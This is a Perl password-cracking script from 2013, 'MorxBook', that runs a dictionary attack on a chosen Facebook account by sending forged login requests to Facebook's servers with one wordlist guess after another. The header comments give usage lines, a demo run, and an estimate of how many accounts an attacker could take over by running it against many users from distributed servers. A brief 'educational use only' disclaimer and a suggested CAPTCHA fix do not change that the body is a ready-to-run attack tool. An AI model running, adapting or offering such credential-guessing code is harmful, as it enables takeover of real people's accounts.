#!/usr/bin/perl
#
# Tool: MorxBook
# Author: Simo Ben youssef
# Contact: simo_at_morxploit_dot_com
# Code date: 17 April 2013
# MorXploit Research
# http://www.morxploit.com
#
# Description:
# MorxBook is a password cracking tool written in perl to perform a dictionary-based attack on a specific Facebook user through HTTPS.
#
# Usage:
# perl MorxBook.pl login wordlist
# login could be either a user's email address or profile name
#
# Module Requirements:
# Net::SSLeay module
#
# Install module if missing:
# perl -MCPAN -e 'install Net::SSLeay'
#
# Demo:
# perl morxbook.pl mzpoxfe_zamoresky_1366266598@tfbnw.net test.lst 
#
# --- MorxBook Facebook password cracking tool
# --- By Simo Ben youssef
# --- www.morxploit.com
#
# [+] Cracking mzpoxfe_zamoresky_1366266598@tfbnw.net ...
#
# [-] test -> Failed
# [-] test123 -> Failed
# [-] testtest -> Failed
# [-] testest123 -> Failed
# [-] qwerty -> Failed
# [-] azerty -> Failed
# [-] password -> Failed
# [-] password123 -> Failed
#
########################################################
# [+] CRACKED! Your password is 8llojdix1jg
########################################################
#
# Note:
# Cracking passwords through HTTPS is a slow process, using my internet cable
# I was able to process 100 passwords in about 50 seconds.
# 
# So if the attack is launched, let's say against 1000 users using a dictionary
# list of 100 passwords, the attack will take about 14 hours to complete.
# If we consider a success rate of 5% per 100 users attacked then the result will
# be 50 compromised accounts out of 1000 which's a small number but still a win for
# any attacker.
# Also note, if an attacker distributes the attack through different servers, the
# attack will take less time and more passwords will be cracked.
#
# Fix?
# Pretty easy: Facebook needs to use Captcha.
# Meanwhile and as a general rule, users need to use strong password combinations.
#
# Author disclaimer:
# MorxBook was written for educational, demonstration and testing purposes only.
# Use on your own account and at your own risk.
# Author cannot be held responsible for any malicious use.

use strict;
use Net::SSLeay::Handle;

if(!defined($ARGV[0] && $ARGV[1])) {

system('clear');
print "\n--- MorxBook Facebook password cracking tool\n";
print "--- By Simo Ben youssef\n";
print "--- www.morxploit.com\n\n";
print "--- Usage: perl $0 login wordlist\n\n";
exit; }

my $user = $ARGV[0];
my $wordlist = $ARGV[1];

open (LIST, $wordlist) || die "\n[-] Can't find/open $wordlist\n";

print "\n--- MorxBook Facebook password cracking tool\n";
print "--- By Simo Ben youssef\n";
print "--- www.morxploit.com\n";
print "\n[+] Cracking $user ...\n\n";

while (my $password = <LIST>) {
chomp ($password);
$password =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;

my $a = "POST /login.php HTTP/1.1";
my $b = "Host: www.facebook.com";
my $c = "Connection: close";
my $e = "Cache-Control: max-age=0";
my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
my $g = "Origin: https://www.facebook.com";
my $h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31";
my $i = "Content-Type: application/x-www-form-urlencoded";
my $j = "Accept-Encoding: gzip,deflate,sdch";
my $k = "Accept-Language: en-US,en;q=0.8";
my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";

my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa";
my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$user&pass=$password&default_persistent=0&login=Log+In";
my $cl = length($post);
my $d = "Content-Length: $cl";


my ($host, $port) = ("www.facebook.com", 443);

tie(*SSL, "Net::SSLeay::Handle", $host, $port);
  

print SSL "$a\n";
print SSL "$b\n";
print SSL "$c\n";
print SSL "$d\n";
print SSL "$e\n";
print SSL "$f\n";
print SSL "$g\n";
print SSL "$h\n";
print SSL "$i\n";
print SSL "$j\n";
print SSL "$k\n";
print SSL "$l\n";
print SSL "$cookie\n\n";

print SSL "$post\n";

my $success;
while(my $result = <SSL>){
if($result =~ /Location(.*?)/){
$success = $1;
}
}
if (!defined $success)
{
print "[-] $password -> Failed\n";
close SSL;
}
else
{
print "\n########################################################\n";
print "[+] CRACKED! Your password is $password\n";
print "########################################################\n\n";
close SSL;
exit;
}
}
